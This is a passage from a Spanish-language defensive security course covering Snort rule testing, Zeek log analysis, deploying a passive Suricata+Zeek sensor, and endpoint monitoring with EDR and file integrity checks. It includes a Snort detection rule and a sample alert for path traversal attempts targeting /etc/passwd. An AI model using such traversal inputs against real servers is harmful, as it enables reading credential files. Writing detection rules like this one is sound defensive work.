alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"POSIBLE ATAQUE - Intento de Path Traversal a /etc/passwd";
    flow:to_server,established;
    content:"etc/passwd";
    nocase;
    classtype:web-application-attack;
    sid:1000002;
    rev:1;
)
```

- `flow:to_server,established`: Evalúa solo paquetes dirigidos hacia el servidor dentro de una sesión TCP ya establecida (_three-way handshake_ completado). Evita falsos positivos con escaneos a ciegas o respuestas devueltas por el propio servidor.
- `content:"etc/passwd"`: Busca esa secuencia exacta de texto dentro de la carga útil (_payload_) del paquete.
- `nocase`: Modificador que ignora mayúsculas y minúsculas (coincide con `etc/passwd`, `Etc/Passwd` o `ETC/PASSWD`), evitando evasiones simples.
- `classtype:web-application-attack`: Asigna la categoría estándar de la alerta para facilitar la priorización y el triaje en un SIEM o consola central.

### 3. Ejecutar Snort 3 contra un archivo `.pcap` existente

Una vez verificado que tienes Snort 3 disponible en tu entorno (`snort -V`), no necesitas conectarlo a la red viva de la empresa para probar tus reglas. Puedes ordenarle que lea el archivo `captura.pcap` y aplique tu archivo `local.rules` mostrando las alertas en pantalla:

```bash:terminal
snort -q -c /etc/snort/snort.lua -R local.rules -r /tmp/captura.pcap -A alert_fast
```

- `-q`: Modo silencioso (evita imprimir banners largos de inicio en la terminal).
- `-c`: Indica la ruta al archivo de configuración base de Snort 3 (`snort.lua`).
- `-R local.rules`: Carga tu archivo de reglas personalizado.
- `-r /tmp/captura.pcap`: Analiza los paquetes grabados en ese archivo y se cierra al terminar.
- `-A alert_fast`: Imprime en pantalla un resumen limpio por cada paquete que haya coincidido con tus reglas.

### 4. Tráfico coincidente

Si la captura contiene tráfico que coincide con la regla de ataque, Snort mostrará una línea como esta:

```text
05/12-10:15:22.451020 [**] [1:1000002:1] POSIBLE ATAQUE - Intento de Path Traversal a /etc/passwd [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 203.0.113.50:42188 -> 192.168.1.10:80
```

:::

#### ¿Qué hace el motor cuando un paquete coincide con la condición?

Cuando un paquete coincide con una regla o condición del IDS (Sistema de Detección de Intrusos) o IPS (Sistema de Prevención de Intrusos), la acción del motor depende fundamentalmente de si el dispositivo está configurado para detectar o para prevenir.

:::group title="Acciones posibles en una regla"

- alert [Modo IDS]: Genera una alerta registrando el evento, pero deja pasar el paquete normalmente.
- log [Modo Registro]: Guarda el paquete para análisis sin disparar una alerta de seguridad.
- pass [Exclusión]: Ignora el paquete y permite que pase sin evaluarlo contra el resto de las reglas (útil para silenciar falsos positivos de equipos confiables).
- drop [Modo IPS en línea]: Descarta ese paquete inmediatamente e impide que llegue a su destino.
- block [Modo IPS en línea]: Descarta el paquete actual y bloquea todos los paquetes siguientes de esa misma sesión.
  :::

### 5.2.4. Zeek <!-- id: herramienta-zeek, icon: Database01Icon, displayTitle: 05.2.10 — Zeek, description: Monitoreo de seguridad de red (NSM), generación de registros estructurados por protocolo y trazabilidad de sesiones mediante UID. -->

Hasta aquí vimos cómo inspeccionar paquetes sueltos con Wireshark y cómo recibir alertas de ataques conocidos con Suricata o Snort. Pero, ¿qué ocurre cuando un atacante utiliza un malware nuevo o se conecta a un servidor desconocido para el cual **todavía nadie escribió una regla de detección**? Cuando una amenaza no coincide con ninguna regla o condición de detección disponible, estas herramientas pueden no generar una alerta. Esto no significa que la actividad sea invisible, sino que necesitamos otras formas de analizar el comportamiento de la red.

Aquí es donde entra [**Zeek**](https://zeek.org). Zeek no busca firmas de ataques ni bloquea paquetes; su función es observar silenciosamente todo el tráfico y **anotar un diario detallado y ordenado de cada conversación en archivos de registro (`.log`)** estructurados y separados por protocolo.

| Archivo generado por Zeek | ¿Qué información guarda automáticamente?                                                                  | Ejemplo de pregunta que permite responder en una PyME                                                   |
| :------------------------ | :-------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------ |
| **`conn.log`**            | Todas las conexiones TCP/UDP/ICMP: IPs, puertos, cuánto duró la charla y cuántos bytes se enviaron.       | _¿Qué computadoras internas se conectaron a la IP sospechosa `198.51.100.40` durante la última semana?_ |
| **`dns.log`**             | Cada consulta de nombre de dominio que hizo cualquier equipo y qué IP le respondió el servidor DNS.       | _¿Algún equipo de la oficina intentó buscar el dominio malicioso reportado hoy en las noticias?_        |
| **`http.log`**            | Detalles de navegación web sin cifrar (dirección URL, navegador utilizado, respuesta del servidor).       | _¿Desde qué página interna sin cifrar se descargó un archivo ejecutable?_                               |
| **`ssl.log`**             | Datos visibles de las conexiones cifradas TLS (nombres de servidor solicitados, validez de certificados). | _¿Hacia qué sitios HTTPS se están conectando los servidores de noche?_                                  |
| **`files.log`**           | Metadatos y resúmenes criptográficos (hashes) de los archivos que viajaron por la red.                    | _¿Qué archivo exacto circuló por la red en esa conexión?_                                               |
| **`weird.log`**           | Comportamientos extraños de red o paquetes malformados que no respetan los estándares técnicos.           | _¿Hay algún equipo mal configurado o intentando técnicas raras de evasión en la red local?_             |

Todos estos archivos comparten un campo fundamental llamado **`uid`** (identificador único de conexión). Si localizas una conexión extraña en `conn.log`, copias su código `uid`, lo buscas en `dns.log`, `ssl.log` o `http.log` y descubres al instante qué nombre de dominio pidió y qué hizo en esa misma sesión sin necesidad de abrir Wireshark ni reconstruir paquetes manualmente.

#### Tutorial desde cero: Análisis de tráfico y trazabilidad con Zeek

Este tutorial guía paso a paso desde la instalación y la preparación de una captura de prueba, pasando por la generación de registros y consultas analíticas, hasta el pivote forense por `uid` y la inspección en vivo.

:::steps

### 1. Instalar Zeek en tu entorno de trabajo

Puedes instalar Zeek directamente en tu sistema operativo o utilizar el contenedor Docker oficial:

- **En Ubuntu / Debian:** `sudo apt update && sudo apt install -y zeek jq`. Si tu distribución ubica los ejecutables en `/opt/zeek/bin`, asegúrate de incluir esa ruta en tu variable de entorno: `export PATH=$PATH:/opt/zeek/bin`.
- **En macOS (con Homebrew):** `brew install zeek jq`
- **Alternativa universal con Docker (sin instalar dependencias en el host):** `docker pull zeek/zeek:latest`

```bash:terminal
#  Comprueba que Zeek responda correctamente consultando su versión:
zeek --version
```

### 2. Preparar el directorio de trabajo y la captura de prueba

Para practicar desde cero de forma ordenada, crea un directorio limpio. Si ya cuentas con un archivo `.pcap` previo, cópialo a este directorio; si no dispones de ninguno, puedes generar una muestra rápida de 100 paquetes en vivo con `tcpdump`:

```bash:terminal
# Crear y acceder a la carpeta de práctica
mkdir -p ~/analisis-zeek && cd ~/analisis-zeek

# (Opcional) Capturar tráfico de prueba si no tienes un archivo .pcap previo
sudo tcpdump -i any -c 100 -w /tmp/captura_prueba.pcap
cp /tmp/captura_prueba.pcap ./captura.pcap
```

### 3. Procesar el archivo `.pcap` y generar registros estructurados

Ejecuta Zeek con el comando de abajo, indicando la lectura de la captura mediante el parámetro `-r`. Agregamos la opción `LogAscii::use_json=T` para que guarde los eventos en formato JSON (una línea por evento), lo que facilita enormemente su posterior filtrado y consulta. Luego, Zeek habrá creado de manera automática únicamente los archivos correspondientes a los protocolos presentes en la captura (como `conn.log`, `dns.log`, `ssl.log`, etc.).

```bash:terminal
zeek -r captura.pcap LogAscii::use_json=T
```

### 4. Consultar conexiones y nombres de dominio con `jq`

Al tener los registros en formato JSON, puedes interrogar los archivos directamente desde la terminal como si fuesen una base de datos liviana:

- **Resumen de conexiones de red (`conn.log`):** Identifica quién se comunicó con quién, el protocolo de transporte, el servicio detectado y la duración de la sesión:

```bash:terminal
jq '{origen: .["id.orig_h"], destino: .["id.resp_h"], proto: .proto, servicio: .service, duracion: .duration}' conn.log
```

- **Auditoría de resolución de nombres (`dns.log`):** Averigua qué máquinas internas realizaron consultas DNS y qué dirección IP obtuvieron como respuesta:

```bash:terminal
jq '{equipo: .["id.orig_h"], dominio_buscado: .query, ip_devuelta: .answers}' dns.log
```

- **Visibilidad sobre tráfico TLS/HTTPS (`ssl.log`):** Descubre a qué sitios web cifrados se conectaron los usuarios inspeccionando el campo SNI (_Server Name Indication_):

```bash:terminal
jq '{cliente: .["id.orig_h"], servidor_sni: .server_name, version_tls: .version}' ssl.log
```

### 5. Trazabilidad forense mediante el identificador único (`uid`)

El mayor superpoder de Zeek para un analista es el campo `uid` (_Unique ID_). Supongamos que en `conn.log` observas una conexión sospechosa saliente y su identificador es `CHhAvV32JBEArr62kN`.

Puedes buscar ese identificador en todos los archivos generados para reconstruir toda la sesión de punta a punta:

```bash:terminal
# Filtrar en todos los registros el identificador sospechoso
grep "CHhAvV32JBEArr62kN" *.log
```

O de forma estructurada con `jq`:

```bash:terminal
jq 'select(.uid == "CHhAvV32JBEArr62kN")' dns.log ssl.log http.log
```

En segundos verás la secuencia completa: qué dominio consultó la máquina en `dns.log`, a qué servidor web se conectó en `ssl.log` o `http.log` y qué volumen transfirió en `conn.log`, sin necesidad de buscar paquete por paquete en Wireshark.

### 6. Enriquecer el análisis cargando scripts (cálculo de hashes de archivos)

Zeek incorpora su propio lenguaje de scripting para extender su comportamiento. Por ejemplo, puedes ordenarle que calcule resúmenes criptográficos (MD5 y SHA1) de cualquier archivo transferido sin cifrar en la captura, invocando el script preinstalado `hash-all-files`:

```bash:terminal
zeek -r captura.pcap frameworks/files/hash-all-files LogAscii::use_json=T
```

Luego revisa `files.log` para ver los hashes calculados:

```bash:terminal
jq '{archivo: .filename, mime: .mime_type, md5: .md5, sha1: .sha1}' files.log
```

Estos hashes pueden contrastarse directamente en servicios de inteligencia de amenazas (como VirusTotal) para verificar si circuló malware en la red.

### 7. Monitorear una interfaz de red en tiempo real

Para poner a Zeek a escuchar una tarjeta de red en vivo (por ejemplo `enp1s0` o `eth0`), utiliza el parámetro `-i` junto con `-C` (esta bandera le indica ignorar posibles errores en los checksums de red ocasionados por la descarga por hardware o _checksum offloading_ de la placa):

```bash:terminal
sudo zeek -i enp1s0 -C LogAscii::use_json=T
```

Para detener la captura en vivo, presiona `Ctrl + C`. En un despliegue de monitoreo permanente de 24/7 para una PyME, se utiliza el componente gestor incluido `zeekctl` (_ZeekControl_), el cual administra el inicio automático, la rotación de logs diaria y el archivado comprimido.
:::

#### Aplicación práctica en una PyME y recursos oficiales

Zeek es la solución idónea para una PyME que necesita mantener un **registro histórico de auditoría de red sin saturar el almacenamiento**. Guardar archivos `.pcap` crudos de toda la empresa durante meses es inviable por el volumen de gigabytes diarios que requiere; en cambio, los archivos `.log` estructurados de Zeek comprimidos ocupan apenas una fracción de espacio (alrededor del 1% del tráfico crudo) y conservan toda la información forense indispensable para responder auditorías o investigar incidentes pasados.

Para profundizar en el desarrollo de scripts personalizados, despliegue en clúster con `zeekctl` y paquetes de la comunidad:

- [Sitio web oficial de Zeek](https://zeek.org): Portal central del proyecto, descargas y anuncios de versiones.
- [Documentación oficial de Zeek](https://docs.zeek.org): Manual de usuario, referencia del lenguaje de scripts y guías operativas.

### 5.2.5. Guía de Implementación <!-- id: seleccion-implementacion-red, icon: ToolsIcon, displayTitle: 05.2.5 — Selección e Implementación, description: Matriz de decisión técnica para elegir herramientas de red y guía práctica para desplegar un sensor pasivo integrado en una PyME. -->

Una vez estudiadas las cinco herramientas, el desafío para el responsable técnico de una organización radica en **no dispersar recursos**: saber con exactitud cuál de ellas activar ante una necesidad concreta y cómo desplegar una arquitectura de sensores que no interrumpa las operaciones del negocio.

#### Matriz de decisión: ¿Qué herramienta seleccionar según el caso?

No existe una única herramienta que resuelva todas las necesidades de visibilidad de red. La siguiente matriz guía la elección según el escenario operativo, los recursos técnicos disponibles y el objetivo inmediato:

| Escenario operativo                                                                    | Herramienta recomendada                | ¿Por qué elegirla?                                                                                                                                         | Requisitos / Limitación clave                                                                                       |
| :------------------------------------------------------------------------------------- | :------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------ |
| **Diagnóstico de emergencia en servidor remoto sin interfaz gráfica**                  | **`tcpdump`**                          | Siempre disponible, ultra liviano, no satura memoria y captura paquetes crudos con filtros quirúrgicos (BPF).                                              | Salida en consola de difícil interpretación masiva; exige descargar el PCAP para análisis profundo.                 |
| **Investigación forense visual detallada tras un incidente**                           | **`Wireshark`**                        | Permite reconstruir flujos completos (Follow Stream), explorar cada campo de cabecera y filtrar visualmente sin pérdida de datos.                          | No debe ejecutarse de forma continua como demonio en servidores; se utiliza en la estación de trabajo del analista. |
| **Vigilancia perimetral y detección automatizada de amenazas 24/7**                    | **`Suricata`**                         | Motor multihilo de alto rendimiento, reglas actualizadas de la comunidad (Emerging Threats) y emisión nativa de alertas en JSON estructurado (`eve.json`). | Requiere puerto espejo (SPAN) o TAP; solo detecta lo que coincide con una firma o regla conocida.                   |
| **Validación de reglas locales, laboratorio y análisis académico**                     | **`Snort 3`**                          | Formato de firmas estándar de la industria, ideal para aprender la sintaxis universal de reglas y probarlas offline contra capturas.                       | Instalación en producción más compleja desde fuentes; en entornos PyME se prefiere Suricata para producción.        |
| **Historial de auditoría, trazabilidad de protocolos y amenazas sin firma (Zero-Day)** | **`Zeek`**                             | No depende de firmas; registra cada sesión TCP/UDP, consulta DNS y certificado TLS con identificadores unificados (`uid`).                                 | Demanda mayor consumo de almacenamiento para conservar archivos de log históricos a lo largo del tiempo.            |
| **Arquitectura de Monitoreo Integral para PyMEs (Stack Lilium)**                       | **`Suricata` + `Zeek` en sensor SPAN** | Combinación ideal: Suricata actúa como el **sistema de alarma** en tiempo real y Zeek como el **libro de actas forense**.                                  | Requiere un servidor o VM dedicado con dos tarjetas de red (una de gestión y una de captura sin IP).                |

#### Guía práctica de implementación: Despliegue de un Sensor Pasivo Integrado

Para una PyME, la forma más sólida y segura de implementar visibilidad de red consiste en construir un **sensor pasivo dedicado**. Este diseño utiliza un equipo físico modesto o una máquina virtual con **dos interfaces de red físicas o virtuales**:

1. **Interfaz de Gestión (`eth0`):** Conectada a la red administrativa de la empresa, con dirección IP estática protegida y acceso SSH restringido exclusivamente a los operadores.
2. **Interfaz de Escucha / Sniffing (`eth1`):** Conectada directamente al puerto espejo (SPAN) del switch. Esta interfaz opera en **modo promiscuo y SIN dirección IP asignada**, lo que la vuelve matemáticamente invisible: nadie en la red monitoreada puede escanear, atacar ni comunicarse con el sensor a través del cable de monitoreo.

```
       [ Tráfico de Internet ]
                  │
          ┌───────┴───────┐
          │ Cortafuegos   │
          └───────┬───────┘
                  │  (Enlace perimetral)
          ┌───────┴───────────────────────┐
          │ Switch Administrable (Core)   │
          │  Puerto SPAN (Copia de flujo) ───┐ (Cable de monitoreo)
          └───────┬───────────────────────┘  │
                  │                          ▼
          ┌───────┴───────┐        ┌─────────────────────────┐
          │ Red de PyME   │        │ SENSOR DEDICADO         │
          │ (VLANs / DMZ) │        │  NIC 1: Sin IP (Sniff)  │
          └───────────────┘        │         Suricata + Zeek │
                                   │  NIC 2: Gestión (SSH/IP)│
                                   └────────────┬────────────┘
                                                │ (Alertas JSON)
                                                ▼
                                   [ SIEM / Colector Logs ]
```

:::steps

### 1. Configurar la interfaz de escucha en modo promiscuo y sin dirección IP

En el servidor Linux (Debian o Ubuntu) destinado al sensor, identifica la interfaz conectada al puerto espejo (por ejemplo, `enp2s0`). Para garantizar que no tenga IP y que arranque en modo promiscuo tras cada reinicio, configúrala en `/etc/netplan/01-sensor.yaml`:

```yaml:/etc/netplan/01-sensor.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    enp1s0:
      dhcp4: false
      addresses: [192.168.10.50/24] # IP de gestión administrativa
      routes:
        - to: default
          via: 192.168.10.1
    enp2s0:
      dhcp4: false
      dhcp6: false
      activation-mode: off
```

Aplica el modo promiscuo mediante un comando directo o una regla de inicio con `ip link`:

```bash:terminal
sudo ip link set enp2s0 promisc on
sudo ip link set enp2s0 up
```

Verifica con `ip -br addr show enp2s0`: la interfaz debe figurar en estado `UP`, sin ninguna dirección IPv4 o IPv6 asociada y con la bandera `PROMISC`.

### 2. Puesta en marcha de Suricata para detección continua de intrusiones

Asigna la interfaz `enp2s0` dentro de `/etc/suricata/suricata.yaml` en la sección `af-packet`. Habilita el hilo de actualización automática de firmas mediante un temporizador del sistema:

```bash:terminal
sudo suricata-update
sudo systemctl enable --now suricata
```

A partir de este momento, cualquier ataque conocido o escaneo que cruce el switch principal quedará registrado de inmediato en `/var/log/suricata/eve.json`.

### 3. Puesta en marcha de Zeek para trazabilidad y metadatos de sesión

Configura Zeek para que escuche la misma tarjeta de red (`enp2s0`) editando `/opt/zeek/etc/node.cfg`:

```ini:/opt/zeek/etc/node.cfg
[zeek]
type=standalone
host=localhost
interface=enp2s0
```

Si deseas que Zeek genere automáticamente sus registros en formato JSON para facilitar su correlación futura con Suricata y con el SIEM del Módulo 5.4, añade al final de `/opt/zeek/share/zeek/site/local.zeek`:

```zeek:/opt/zeek/share/zeek/site/local.zeek
@load policy/tuning/json-logs.zeek
```

Inicia la supervisión del servicio mediante ZeekControl:

```bash:terminal
sudo zeekctl check
sudo zeekctl deploy
```

Zeek comenzará a estructurar el historial cronológico de todas las conexiones en `/opt/zeek/logs/current/`.

### 4. Flujo de trabajo del analista: Inspección puntual con Wireshark

Cuando una alerta crítica aparezca en el archivo `eve.json` de Suricata, no intentes descargar gigabytes de capturas indiscriminadas. Utiliza `tcpdump` en el propio sensor para extraer únicamente los minutos y las IPs involucradas en el incidente:

```bash:terminal
sudo tcpdump -i enp2s0 -nn -s 0 "host 192.168.1.150 and port 443" -c 1000 -w /tmp/incidente_extraido.pcap
```

Transfiere ese archivo acotado a tu estación de trabajo mediante SCP:

```bash:terminal
scp analista@192.168.10.50:/tmp/incidente_extraido.pcap ~/analisis/
```

Ábrelo en Wireshark en tu computadora para reconstruir la conversación y validar la gravedad del evento. Una vez descargado, elimina el archivo del sensor para mantener la higiene de evidencias.

:::

### 5. Rutina operativa de triaje diario (15 minutos)

Para que el sensor no se convierta en un repositorio pasivo de datos ignorados, establece una rutina diaria matutina de 15 minutos:

1. **Revisar alertas críticas de Suricata:**
   ```bash:terminal
   sudo tail -n 100 /var/log/suricata/eve.json | jq 'select(.event_type=="alert" and .alert.severity <= 2) | {hora: .timestamp, origen: .src_ip, destino: .dest_ip, regla: .alert.signature}'
   ```
2. **Auditar consultas DNS sospechosas en Zeek:**
   ```bash:terminal
   tail -n 200 /opt/zeek/logs/current/dns.log | jq 'select(.query | test("\\.xyz$|\\.top$|\\.onion$")) | {equipo: .["id.orig_h"], dominio: .query}'
   ```
3. **Comprobar paquetes malformados o evasiones:**
   ```bash:terminal
   tail -n 50 /opt/zeek/logs/current/weird.log | jq '{tipo: .name, origen: .["id.orig_h"], mensaje: .notice}'
   ```

Esta arquitectura proporciona a una pequeña o mediana empresa una capacidad de detección de nivel profesional con costo de licenciamiento cero, preparando la telemetría de red para su integración con la visibilidad en endpoints que abordaremos en la sección `05.3`.

## 5.3. Visibilidad en el Endpoint <!-- id: visibilidad-endpoint, icon: Shield01Icon, displayTitle: 05.3 — Visibilidad en el Endpoint, description: Telemetría interna de sistemas, tecnologías de protección (AV, EDR, HIDS), monitoreo de integridad de archivos (FIM) y escalonamiento para PyMEs. -->

Una amenaza no siempre necesita atravesar una conexión de red sospechosa para comprometer una organización. Puede ejecutarse directamente en una estación de trabajo a través de un archivo adjunto, aprovechar herramientas legítimas que ya están instaladas en el sistema operativo o modificar archivos críticos sin generar señales evidentes en el tráfico de red. Para detectar estas actividades, al mismo tiempo que se observan las comunicaciones en tránsito (como vimos en la sección `05.2`), es indispensable observar lo que sucede **dentro** de cada dispositivo.

La visibilidad en el _endpoint_ (del inglés, el "punto final") traslada la observación hacia los servidores, computadoras portátiles y estaciones de trabajo. Mediante tecnologías como el antimalware, los sistemas de detección de intrusiones (IDS) basados en host, las plataformas EDR (_Endpoint Detection and Response_) y el monitoreo de integridad de archivos (_File Identity Monitoring_ o FIM), una organización deja de depender exclusivamente de su firewall y gana la capacidad de identificar comportamientos anómalos directamente en el lugar donde residen los datos y se ejecutan los procesos.

### El problema: ¿Qué sucede dentro de un dispositivo?

El tráfico de red tiene un límite arquitectónico: **no siempre permite conocer qué proceso exacto inició la conexión ni qué impacto tuvo en el sistema.**

Supongamos que una computadora establece una conexión web cifrada (`HTTPS`) hacia un servidor externo. Desde el punto de vista del tráfico de red (analizado con un sensor NIDS o Zeek), la comunicación parece normal: es tráfico por el puerto 443 hacia una dirección IP con buena reputación. Sin embargo, esa conexión no la inició el navegador web a pedido del usuario; la inició un script oculto en memoria que está descargando herramientas de _hacking_ adicionales.

Esta ceguera de red se agrava frente a dos tácticas adversarias modernas:

#### Abuso de herramientas legítimas (Living off the Land)

En lugar de arriesgarse a instalar un virus o un troyano desconocido que el antivirus borraría inmediatamente, los atacantes prefieren utilizar las herramientas de administración que ya vienen preinstaladas en el sistema operativo. Aprovechan utilidades como **PowerShell**, **Windows Management Instrumentation (WMI)** o **Bash** en Linux para descargar archivos, crear usuarios ocultos o alterar configuraciones.

Esta táctica se denomina _Living off the Land_ (LotL) —vivir de la tierra—. Su ventaja para el atacante es que la presencia de PowerShell en una computadora de Windows es completamente normal y legítima. La diferencia entre una tarea administrativa diaria y un ataque recae en el contexto: quién ejecutó el comando, desde qué proceso se inició y con qué parámetros ocultos. Sin observar los eventos internos del _endpoint_, distinguir una de la otra es casi imposible.

#### Malware sin archivos tradicionales (Fileless Malware)

Los controles defensivos clásicos se basan en escanear el disco duro en busca de archivos ejecutables (`.exe`, `.elf`) sospechosos. Sin embargo, muchas intrusiones actuales intentan no tocar el disco duro. El código malicioso se inyecta y ejecuta directamente en la memoria RAM del equipo o se oculta dentro de las claves del Registro de Windows. Al no existir un archivo físico tradicional que analizar, las protecciones que se limitan a leer el disco quedan completamente inoperantes.

> [!NOTE]
> El término _fileless_ (sin archivos) no significa que nunca se escriba absolutamente nada en el disco. Un atacante puede usar archivos temporales, scripts o accesos directos. Lo que lo caracteriza es que no depende de un ejecutable malicioso clásico como arma principal.

#### ¿Qué información interna necesitamos observar?

Para combatir estas tácticas, la visibilidad en el _endpoint_ debe recolectar la telemetría interna del sistema operativo. Las fuentes críticas incluyen:

- **Creación de procesos:** Qué programa se inició, a qué hora y qué otro programa lo ejecutó (árbol de procesos).
- **Argumentos de ejecución:** Los comandos exactos y parámetros ocultos pasados a la terminal.
- **Archivos críticos:** Creación, borrado y modificación de archivos esenciales del sistema operativo.
- **Configuraciones de persistencia:** Cambios en claves del registro o servicios de inicio automático que permiten al atacante sobrevivir a un reinicio del equipo.

### Tecnologías de seguridad en el endpoint (AV, HIDS, HIPS, EDR)

Cada una de las tecnologías se posiciona en un nivel diferente de detección y prevención:

:::group title="Categorías funcionales de protección en el Endpoint" description="Clasificación de herramientas según su objetivo y alcance"

- Antivirus / Antimalware (AV): Su objetivo principal es preventivo y estático. Busca archivos en el disco, los compara con una base de datos de firmas conocidas (amenazas ya identificadas por la industria) o evalúa su estructura mediante heurística, y los bloquea o envía a cuarentena si encuentra coincidencias.
- Detección de Intrusiones basada en Host (HIDS): Es un agente pasivo de monitoreo. Recopila eventos locales (inicios de sesión fallidos, cambios en archivos de configuración) y los compara con reglas de alerta. Si detecta un comportamiento anómalo (ej. un usuario modificó el archivo de configuración SSH), genera un aviso, pero no bloquea la acción.
- Prevención de Intrusiones basada en Host (HIPS): A diferencia del HIDS, es un agente activo. Se interpone en la ejecución de los procesos en tiempo real para bloquear comportamientos no autorizados (ej. impedir que un programa descargado de Internet escriba en una carpeta protegida del sistema).
- Detección y Respuesta en el Endpoint (EDR): Evolución moderna que funciona como la caja negra de un avión. Graba continuamente un historial profundo de la telemetría del equipo (qué procesos nacieron, qué archivos tocaron, a qué IP se conectaron). Permite reconstruir la línea de tiempo completa de un ataque para investigar técnicas evasivas y ofrece acciones remotas de respuesta, como aislar el equipo de la red con un clic.
  :::

### Monitoreo de Integridad de Archivos (FIM)

El Monitoreo de Integridad de Archivos (FIM, _File Integrity Monitoring_) es un control detectivo cuyo propósito es detectar si un atacante (o un error administrativo) ha modificado un archivo crítico del sistema operativo, una aplicación, configuración o base de datos para detectar si han sido alterados, corrompidos o modificados sin autorización

#### ¿Cómo funciona el monitoreo de integridad?

1. **Definición de la línea base confiable:** El sistema calcula los resúmenes criptográficos (`hashes` mediante algoritmos como SHA-256) de los archivos críticos cuando el servidor se encuentra en un estado limpio, seguro y verificado. Esta lista inicial actúa como la referencia inmutable de cómo deben lucir los archivos legítimos.
2. **Supervisión continua o periódica:** El agente inspecciona constantemente el estado de los archivos supervisados (en tiempo real o mediante análisis programados) y compara sus propiedades actuales contra los valores de la línea base registrada para comprobar si han sido modificados.
3. **Disparo y contextualización de alertas:** Ante cualquier discrepancia en el contenido, permisos o propietario, el motor genera un evento detallando qué archivo cambió, en qué momento exacto y qué proceso o usuario ejecutó la acción.

Estos controles permiten identificar cuándo un atacante modifica binarios del sistema, inyecta scripts o altera mecanismos de arranque para mantener persistencia, incluso sin haber descargado malware tradicional en disco, y proporcionan un registro histórico inalterable de modificaciones sobre archivos, facilitando la reconstrucción de la línea de tiempo ante incidentes o errores operativos.

Implementar FIM no significa vigilar los documentos de los empleados o las descargas temporales. Su valor reside en supervisar exclusivamente los componentes que mantienen la seguridad y estabilidad del dispositivo:

- **En servidores Linux:** El archivo de contraseñas locales (`/etc/passwd` y `/etc/shadow`), la configuración de acceso remoto seguro (`/etc/ssh/sshd_config`), los archivos de inicio de servicios (`/etc/systemd/system`) y los directorios de binarios principales (`/usr/bin` y `/usr/sbin`).
- **En servidores y equipos Windows:** El directorio central del sistema operativo (`C:\Windows\System32`), las carpetas donde se instala el software corporativo crítico, los archivos de configuración de servicios, y las claves del Registro de Windows que controlan qué programas se inician automáticamente al prender el equipo (`Run` y `RunOnce`).

> [!CRITICAL: El problema del Falso Positivo por actualizaciones]
> Activar FIM genera un desafío operativo: las actualizaciones legítimas del sistema operativo y la instalación de parches alteran decenas de archivos críticos de forma natural. Si el motor FIM genera una alerta roja por cada parche de seguridad aplicado, el equipo técnico sufrirá _fatiga de alertas_ y terminará ignorando la herramienta. Las alertas de FIM deben correlacionarse siempre con las ventanas de mantenimiento de los sistemas para evitar cientos de falsos positivos cada vez.

### Integridad criptográfica

Una función hash criptográfica es un algoritmo matemático que toma cualquier volumen de datos —desde un solo archivo hasta un disco duro entero— y genera una secuencia alfanumérica única y de longitud fija denominada **huella digital** o resumen. Esta operación posee una propiedad importante en la seguridad: es computacionalmente imposible revertir el proceso para obtener el archivo original a partir del resumen, y resulta inviable que dos archivos con contenidos distintos produzcan exactamente la misma huella. Gracias a esto, el hash actúa como un sello de identidad digital que permite verificar con absoluta certeza si la información conserva su estado original o si ha sufrido la más mínima alteración.

FIM se encarga de calcular un **resumen criptográfico (hash)** del contenido de los archivos críticos a analizar, utilizando algoritmos seguros como `SHA-256` Si se modifica un solo caracter o espacio dentro de un archivo, su hash `SHA-256` cambiará por completo de forma irreversible.

Sin embargo, un hash permite identificar el contenido, pero no demuestra por sí solo que ese contenido sea confiable o legítimo. Para que la integridad criptográfica funcione, se necesita una **Línea Base Confiable (_Trusted Baseline_)**.

#### Requisitos de una Línea Base Confiable

Una línea base es una fotografía o registro seguro de cómo eran los hashes originales y verificados de los archivos antes de cualquier incidente. Para que sirva de contraste válido en una investigación, debe cumplir tres reglas arquitectónicas (alineadas con el estándar `NIST SP 800-53 Control SI-7`):

1.  **Origen legítimo verificado:** Los hashes originales (el manifiesto) deben calcularse justo después de instalar el servidor desde una fuente oficial y aplicarle sus parches iniciales, cuando tienes certeza absoluta de que el equipo está limpio.
2.  **Almacenamiento aislado e inmutable:** La lista de hashes de referencia no puede guardarse en la misma carpeta del servidor que estás vigilando. Si un atacante entra como administrador, alterará tanto el archivo infectado como el registro local de los hashes originales para que ambos coincidan, burlando la protección. La línea base debe guardarse en un almacenamiento centralizado, externo o con permisos de estricta solo lectura.
3.  **Actualización controlada tras cada parche:** Cada vez que aplicas una actualización legítima de Windows o Linux, debes recalcular la línea base y actualizar el registro externo, para que el sistema aprenda cuáles son los nuevos hashes válidos.

#### Práctica de verificación manual

Si sospechas que un archivo crítico ha sido alterado y cuentas con un repositorio aislado que contiene la firma hash original guardada el mes anterior, puedes verificar la integridad manualmente.

**En Linux:** Este comando devuelve el hash de un archivo (en este caso, `sshd_config`).

```bash:terminal
sudo sha256sum /etc/ssh/sshd_config
```

_Toma el valor alfanumérico devuelto y compáralo visualmente (o mediante un script) contra la lista guardada en tu repositorio de líneas base._

**En Windows (usando PowerShell):**

```powershell:terminal
Get-FileHash -LiteralPath "C:\Windows\System32\notepad.exe" -Algorithm SHA256
```

_El campo `Hash` del resultado debe coincidir milimétricamente con el registro original de la versión exacta de tu sistema operativo._

### Detección de tácticas adversarias en el endpoint

Desplegar las herramientas en el endpoint carece de sentido si no entendemos qué intentamos buscar. Dentro de matriz MITRE ATT&CK se describen los comportamientos y técnicas más utilizadas por adversarios para afectar los endpoints:

1. **T1059 (Command and Scripting Interpreter):** El atacante abusa de intérpretes legítimos (PowerShell, Bash, Python) instalados en el equipo para ejecutar sus comandos de ataque. El **EDR** lo detecta al observar en su telemetría qué proceso invocó a la terminal y qué argumentos inusuales se utilizaron en esa sesión de comandos.
2. **T1218 (System Binary Proxy Execution):** El adversario utiliza un archivo binario nativo y firmado digitalmente por Microsoft o Apple para evadir el antivirus, forzando a ese archivo legítimo a cargar un componente malicioso externo. Un antivirus tradicional lo ignorará al ver que el archivo es oficial de la marca; el **EDR** disparará una alerta al detectar el comportamiento ilógico (por ejemplo, una herramienta de instalación de Windows intentando descargar código desde una IP desconocida en Internet).
3. **T1547 (Boot or Logon Autostart Execution):** El intruso altera las claves del registro de inicio o los archivos de servicios (`systemd`) para asegurar que su código se vuelva a ejecutar automáticamente si el servidor se apaga o reinicia (persistencia). Un motor **FIM** detectará inmediatamente el evento de creación o modificación del archivo crítico de arranque y alertará al administrador.

